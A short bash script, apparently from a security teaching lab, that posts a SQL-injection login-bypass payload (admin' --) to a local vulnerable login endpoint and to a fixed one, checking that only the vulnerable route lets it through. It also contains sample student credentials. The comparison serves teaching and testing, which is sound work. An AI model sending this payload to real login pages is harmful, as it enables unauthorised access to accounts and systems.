#!/usr/bin/env bash
set -euo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
PAYLOAD='{"username":"admin'"'"' -- ","password":"anything"}'
printf '
=== Vulnerable mode: expected HTTP 200 (login bypass) ===
'
curl --silent --show-error --include -X POST "$BASE_URL/api/login-vulnerable" -H 'Content-Type: application/json' --data "$PAYLOAD"
printf '
=== Safe mode: same payload expected HTTP 401 ===
'
curl --silent --show-error --include -X POST "$BASE_URL/api/login-safe" -H 'Content-Type: application/json' --data "$PAYLOAD"
printf '
=== Safe mode: legitimate student credentials expected HTTP 200 ===
'
curl --silent --show-error --include -X POST "$BASE_URL/api/login-safe" -H 'Content-Type: application/json' --data '{"username":"student","password":"StudentLab!"}'
